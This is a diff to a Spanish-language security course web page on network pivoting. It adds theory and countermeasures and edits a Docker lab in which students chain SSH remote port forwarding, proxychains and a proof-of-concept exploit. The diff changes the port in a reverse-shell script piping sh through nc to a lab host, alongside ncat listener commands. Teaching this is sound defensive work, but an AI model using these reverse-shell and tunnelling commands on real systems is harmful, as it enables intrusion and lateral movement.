@@ -89,7 +89,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#pivoting" class="md-skip">
+        <a href="#un-poco-de-teoria" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -692,9 +692,47 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Laboratorio de pivoting
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         Laboratorio de pivoting
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ejemplos-practicos" class="md-nav__link">
+    Ejemplos Prácticos
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#contramedidas-para-evitar-el-pivoting" class="md-nav__link">
+    Contramedidas para Evitar el Pivoting
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -758,6 +796,8 @@
         
           
         
+          
+        
       
       
         
@@ -802,6 +842,20 @@
     <li class="md-nav__item">
       <a href="../../segdef/idps/" class="md-nav__link">
         Monitorización con IDS/IPS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../segdef/hardening.ssh/" class="md-nav__link">
+        Hardening SSH
       </a>
     </li>
   
@@ -899,6 +953,61 @@
                   
 
 
+<h1 id="un-poco-de-teoria">Un poco de teoría</h1>
+<p>En ciberseguridad, el pivoting es una técnica utilizada por atacantes para moverse lateralmente dentro de una red comprometida, utilizando un sistema previamente comprometido como punto de apoyo o "puente" para acceder a otros sistemas o recursos que de otro modo no serían accesibles directamente desde el exterior.</p>
+<p>El pivoting se usa comúnmente después de obtener acceso inicial a una red y es una parte clave en la fase de post-explotación de un ataque. El objetivo principal es maximizar el alcance y obtener más información o acceso a sistemas de alto valor.
+Tipos de Pivoting</p>
+<ul>
+<li>
+<p><strong>Pivoting de red:</strong> Consiste en redirigir el tráfico de una herramienta o servicio hacia una red interna a través de una máquina comprometida. Esto permite al atacante escanear o interactuar con máquinas que solo son accesibles desde la red interna.</p>
+<ul>
+<li><u>Ejemplo:</u> Un atacante compromete un servidor web DMZ que está conectado a una red interna. Desde este servidor, redirige el tráfico a otros servidores internos para realizar reconocimiento o ataques adicionales.</li>
+</ul>
+</li>
+<li>
+<p><strong>Pivoting de archivo/sesión:</strong> Utiliza credenciales o tokens robados en un sistema comprometido para autenticar y moverse a otros sistemas sin necesidad de redireccionar el tráfico de red.</p>
+<ul>
+<li><u>Ejemplo:</u> Un atacante obtiene credenciales válidas en un servidor de base de datos a través de un servidor comprometido y las utiliza para acceder a otros sistemas dentro de la misma red.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ejemplos-practicos">Ejemplos Prácticos</h3>
+<ul>
+<li>
+<p><strong><em>Mediante herramientas de pentesting:</em></strong></p>
+<ul>
+<li><strong>Metasploit:</strong> El atacante usa un exploit para comprometer un sistema, establece un meterpreter session, y configura un proxy o túnel para escanear y atacar otros dispositivos internos.</li>
+<li><strong>ProxyChains:</strong> Se configura un túnel para ejecutar herramientas externas (como nmap o sqlmap) a través del sistema comprometido.</li>
+</ul>
+</li>
+<li>
+<p><strong><em>Ataques de Active Directory:</em></strong> Un atacante compromete un dispositivo de usuario final, roba credenciales y las usa para moverse lateralmente hacia un controlador de dominio u otros servidores críticos.</p>
+</li>
+<li>
+<p><strong><em>VPN y túneles inversos:</em></strong> El atacante establece un túnel SSH o usa herramientas como chisel o frp para crear una conexión desde el sistema comprometido hacia su máquina atacante, permitiéndole acceso continuo a la red interna.</p>
+</li>
+<li>
+<p><strong><em>Ataque a segmentación de red:</em></strong> En una red segmentada, el atacante usa un servidor comprometido como pivote para acceder a otras subredes. Por ejemplo, compromete un servidor en la VLAN de administración y desde allí accede a servidores de producción.</p>
+</li>
+</ul>
+<h2 id="contramedidas-para-evitar-el-pivoting">Contramedidas para Evitar el Pivoting</h2>
+<ul>
+<li>
+<p><strong>Segmentación de red y VLAN:</strong> Asegurar que las subredes estén correctamente segmentadas y que solo los sistemas autorizados puedan comunicarse entre ellas.</p>
+</li>
+<li>
+<p>M<strong>onitorización de tráfico:</strong> Detectar conexiones inusuales desde servidores comprometidos hacia otras partes de la red interna.</p>
+</li>
+<li>
+<p><strong>Políticas de privilegios mínimos:</strong> Asegurarse de que los usuarios y servicios tengan acceso solo a lo estrictamente necesario.</p>
+</li>
+<li>
+<p><strong>Uso de EDR/NDR:</strong> Implementar soluciones que detecten movimientos laterales y actividades de red sospechosas.</p>
+</li>
+<li>
+<p><strong>Parcheo de sistemas:</strong> Mantener los sistemas actualizados para reducir las vulnerabilidades explotables que permiten establecer puntos de pivote.</p>
+</li>
+</ul>
 <h1 id="pivoting">Pivoting</h1>
 <p>El pivoting hace referencia a una técnica donde tras comprometer un equipo, nos damos cuenta de que éste nos da acceso a otros equipos o redes a los que de una forma directa no podríamos acceder. Así pues, nuestra máquina comprometida o máquina de salto nos sirve para seguir obteniendo nuevos accesos.</p>
 <p>De forma esquemática</p>
@@ -1039,7 +1148,7 @@ Dáos cuenta de como las imágenes se construyen localmente, cada una haciendo u
 <p>Para el caso del <code>helper</code> utilizamos como base una imagen de <em>phusion</em> que a su vez está basada en Ubuntu pero convenientemente modificada para que trabaje mejor con Docker. Más detalles <a href="https://hub.docker.com/r/phusion/baseimage">aquí</a> </p>
 <p>Para este contenedor se ha habilitado el login de root mediante SSH, algo poco recomendable en términos de seguridad pero que para nuestro escenario ficticio y como prueba de concepto, nos es de utilidad.</p>
 <p>La sentencia <code>extra_hosts</code>añade una entrada en el archivo <code>/etc/hosts</code> del contenedor para que de esta forma podamos utilizar su nombre, en lugar de la IP, para comunicarnos:</p>
-<div class="highlight"><pre><span></span><code>ROM<span class="w"> </span>phusion/baseimage:jammy-1.0.1
+<div class="highlight"><pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">phusion/baseimage:jammy-1.0.1</span>
 
 <span class="k">RUN</span><span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
 <span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
@@ -1220,7 +1329,7 @@ Donde, lo que debéis rellenar en los huecos, por estricto orden de aparición d
 <li>
 <p>Este código para una reverse shell</p>
 <div class="highlight"><span class="filename">rev.sh</span><pre><span></span><code><span class="ch">#!/bin/bash</span>
-rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">172</span>.16.101.11<span class="w"> </span><span class="m">8500</span><span class="w"> </span>&gt;/tmp/f<span class="w">    </span>
+rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">172</span>.16.101.11<span class="w"> </span><span class="m">9000</span><span class="w"> </span>&gt;/tmp/f<span class="w">    </span>
 </code></pre></div>
 </li>
 <li>
@@ -1284,7 +1393,7 @@ Antes de llevar a cabo la explotación, vamos a comprobar que existe conectivida
 <div class="admonition task">
 <p class="admonition-title">Tarea</p>
 <p>Consulta <a href="https://cyberblog.es/index.php/2023/03/19/ssh-tunneling-local-remote-port-forwarding/">este</a> link o cualquier otro que te sea necesario para entender el concepto de remote port forwarding y ser capaz de completar el siguiente comando, que deberá ser ejecutado en <strong>attacker</strong>:</p>
-<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>___<span class="w"> </span>:___:172.16.100.10:___<span class="w"> </span>root@helper<span class="w"> </span>-N<span class="w"> </span>-f
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>___<span class="w"> </span>:___:172.16.100.10:___<span class="w"> </span>root@helper<span class="w"> </span>__<span class="w"> </span>__
 </code></pre></div>
 </div>
 <div class="admonition task">
@@ -1296,9 +1405,9 @@ Antes de llevar a cabo la explotación, vamos a comprobar que existe conectivida
 <p class="admonition-title">Tarea</p>
 <p>Documenta los pasos a seguir con la nueva redirección de puertos y el éxito comprometiendo esta nueva máquina. Elabora un diagrama en <a href="https://app.diagrams.net/">https://app.diagrams.net/</a> donde se vea el proceso:</p>
 <ol>
-<li><code>ssh __ :__:172.16.100.10:__ -R :__:172.16.100.10:__ root@helper -N -f</code></li>
+<li><code>ssh __ :__:172.16.100.10:__ __ :__:172.16.100.10:__ root@helper -N -f</code></li>
 <li><code>python3 -m http.server 80</code></li>
-<li><code>ncat -lvnp 1331</code></li>
+<li><code>ncat -lvnp 9000</code></li>
 <li><code>proxychains4 -q ./poc.sh 172.16.101.21</code></li>
 </ol>
 </div>
